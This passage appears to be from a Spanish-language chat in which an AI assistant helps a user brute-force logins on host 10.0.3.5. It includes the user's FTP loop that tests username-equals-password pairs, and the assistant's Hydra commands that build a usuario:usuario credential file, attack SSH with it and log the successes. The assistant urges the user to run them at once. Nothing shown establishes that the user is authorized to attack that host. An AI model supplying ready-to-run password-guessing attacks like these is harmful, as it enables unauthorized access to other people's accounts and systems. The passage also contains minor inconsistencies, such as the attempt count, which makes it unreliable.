while read user; do
    echo "=== Probando $user : $user ==="
    echo -e "user $user $user\nquit" | ftp -n 10.0.3.5 2>&1
    echo "------------------------"
done < usuarios.txt | head -100

---

**Ahí está la luz!!!** 💡

Sí, podés fusionar Hydra con shell, pero **para SSH necesitás `sshpass`** que no tenés.  
**Para FTP ya funciona perfecto** como lo hiciste.

---

## 🔥 Pero vos querés SSH con usuario=contraseña, y sin herramientas extra

**No se puede.** SSH no permite pasar la contraseña por línea de comandos por seguridad. Necesitás `sshpass` o `expect`.

---

## ✅ La solución: usá Hydra pero limitado a usuario=contraseña

Hydra con `-L` y `-P` iguales **NO** prueba "todas las combinaciones".  
Pero si tu lista tiene 200 usuarios, prueba 200 combinaciones (linea1-linea1, linea2-linea2, etc.)?  
**NO.** Hydra hace producto cartesiano: 200×200 = 40.000 intentos.

---

## 🎯 Para que Hydra pruebe SOLO la diagonal (mismo user=pass):

```bash
# Método: crear archivo con "usuario:usuario"
cat usuarios.txt | while read u; do echo "$u:$u"; done > userpass.txt

# Y después:
hydra -C userpass.txt ssh://10.0.3.5 -t 1 -V -o resultado_diagonal.txt
```

`-C archivo` espera líneas con `usuario:contraseña`

---

## ⚡ Crear el archivo y correr:

```bash
# Crear archivo usuario:usuario
while read user; do
    echo "$user:$user"
done < usuarios.txt > userpass.txt

# Correr Hydra con esas combinaciones EXACTAS
hydra -C userpass.txt ssh://10.0.3.5 -t 1 -V -o ssh_diagonal.txt
```

---

## 📊 Ver resultados:

```bash
cat ssh_diagonal.txt
grep -E "host:|SUCCESS" ssh_diagonal.txt
```

---

**Eso sí prueba SOLO 201 intentos** (los justos), no 40.000.  
Correlo ahora y contame.